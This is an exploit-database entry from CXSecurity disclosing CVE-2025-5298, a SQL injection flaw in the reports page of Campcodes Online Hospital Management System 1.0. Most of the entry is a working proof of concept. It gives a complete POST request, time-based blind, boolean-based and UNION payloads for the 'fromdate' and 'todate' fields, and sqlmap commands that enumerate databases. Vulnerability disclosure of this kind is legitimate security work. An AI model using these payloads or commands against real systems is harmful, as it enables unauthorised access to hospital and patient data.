---
title: Campcodes Online Hospital Management System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025050055
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-30
fetch_date: 2025-10-06T22:24:09.009801
---

# Campcodes Online Hospital Management System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Campcodes Online Hospital Management System 1.0 SQL Injection** **2025.05.29**  Credit:  **[Carine Constantino](https://cxsecurity.com/author/Carine%2BConstantino/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-5298](https://cxsecurity.com/cveshow/CVE-2025-5298/ "Click to see CVE-2025-5298")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Campcodes Online Hospital Management System 1.0 - SQL Injection
# Google Dork: N/A
# Exploit Author: Carine Constantino
# Vendor Homepage: https://www.campcodes.com
# Software Link: https://www.campcodes.com/projects/online-hospital-management-system-using-php-and-mysql/
# Version: 1.0
# Tested on: Linux - Ubuntu Ubuntu 23.10
# CVE: CVE-2025-5298
# Campcodes Online Hospital Management System 1.0 is vulnerable to SQL Injection
# The report in admin/betweendates-detailsreports.php does not validate ‘fromdate’ and ‘todate’ fields
# And allows the processing of SQL Injection queries of the types:
# blind time-based in the ‘fromdate’ field
# boolean-based in the ‘todate’ field
# Union Query in the ‘todate’ field
‘fromdate’ field is vulnerable to SQL Injection on reports accessed on “/admin/betweendates-detailsreports.php” from POST request
POST /HospitalManagementSystem/hospital/hms/admin/betweendates-detailsreports.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/HospitalManagementSystem/hospital/hms/admin/between-dates-reports.php
Cookie: ajs\_anonymous\_id=e18be7d3-2b50-4bed-9962-5cfab989426f; PHPSESSID=hfb8j1phivvf11o2j9cd492oqe
Upgrade-Insecure-Requests: 1
Priority: u=0, i
fromdate=&todate=&submit=
=======================================|| Blind Time Based - ‘fromdate’ field ||==============================================
SQLMap identified the following injection payload:
Parameter: fromdate (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: fromdate=2019-01-01' AND (SELECT 5962 FROM (SELECT(SLEEP(5)))danz) AND 'awPP'='awPP&todate=2025-05-28&submit=
SQLMap first command to confirm the vulnerability: “sqlmap -r request.txt -p fromdate --dbs --random-agent --technique=T”
=======================================|| Boolean Based - ‘todate’ field ||==============================================
‘todate’ field is vulnerable to SQL Injection on reports accessed on “/admin/betweendates-detailsreports.php” from POST request
SQLMap identified the following injection payload:
Parameter: todate (POST)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: fromdate=2019-01-01&todate=2025-05-28' AND 3290=3290 AND 'yOfc'='yOfc&submit=
SQLMap first command to confirm the vulnerability: “sqlmap -r request.txt -p todate --dbs --random-agent --technique=B”
=======================================|| Union Query - ‘todate’ field ||==============================================
Another technique on ‘todate’ field can be exploited
SQLMap identified the following injection payload:
Parameter: todate (POST)
Type: UNION query
Title: Generic UNION query (NULL) - 11 columns
Payload: fromdate=2019-01-01&todate=2025-05-28' UNION ALL SELECT CONCAT(CONCAT('qkpxq','eLwmjRlXmPYByrACqjbUDqzOqYmBeKwQSUSMNXdM'),'qzzbq'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ckvh&submit=
SQLMap first command to confirm the vulnerability: “sqlmap -r request.txt -p todate --dbs --random-agent --technique=U”

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050055)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top